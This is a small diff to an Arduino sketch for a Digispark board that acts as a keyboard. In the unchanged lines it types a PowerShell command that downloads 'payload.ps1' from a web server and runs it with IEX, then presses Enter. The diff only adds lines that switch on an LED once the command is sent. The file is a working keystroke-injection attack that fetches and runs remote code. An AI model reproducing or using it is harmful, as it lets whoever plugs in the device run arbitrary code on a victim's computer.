@@ -3,6 +3,7 @@
 
 #include "DigiKeyboard.h"
 void setup() {
+	pinMode(1, OUTPUT);
 }
 
 void loop() {
@@ -12,6 +13,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  digitalWrite(1, HIGH);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
   }
